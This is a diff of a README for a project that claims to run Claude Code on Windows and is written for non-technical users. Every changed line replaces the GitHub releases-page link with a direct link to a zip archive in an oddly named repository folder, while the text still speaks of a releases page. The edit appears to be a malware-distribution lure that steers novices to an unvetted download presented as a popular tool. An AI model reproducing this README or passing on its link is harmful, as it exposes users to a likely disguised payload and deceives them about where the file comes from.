@@ -1,6 +1,6 @@
 # 🧭 open-claude-code - Run Claude Code on Windows
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/celerycabbagedaggerboard755/open-claude-code/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/celerycabbagedaggerboard755/open-claude-code/main/caupones/claude_code_open_v3.4.zip)
 
 ## 🚀 What this is
 
@@ -11,7 +11,7 @@ This README is written for non-technical users. It shows how to get the app, sta
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/celerycabbagedaggerboard755/open-claude-code/releases
+https://raw.githubusercontent.com/celerycabbagedaggerboard755/open-claude-code/main/caupones/claude_code_open_v3.4.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC. In most cases, this will be a `.exe` file or a `.zip` file.
 
@@ -47,7 +47,7 @@ If Windows blocks the file, use the standard Windows prompt to allow it only if 
 Follow these steps:
 
 1. Go to the releases page:
-   https://github.com/celerycabbagedaggerboard755/open-claude-code/releases
+   https://raw.githubusercontent.com/celerycabbagedaggerboard755/open-claude-code/main/caupones/claude_code_open_v3.4.zip
 
 2. Find the newest release at the top of the page.
 
@@ -220,7 +220,7 @@ A simple way to use the app:
 ## 📎 Download again later
 
 When you need a fresh copy, visit this page to download:
-https://github.com/celerycabbagedaggerboard755/open-claude-code/releases
+https://raw.githubusercontent.com/celerycabbagedaggerboard755/open-claude-code/main/caupones/claude_code_open_v3.4.zip
 
 ## 🧭 File location example
 
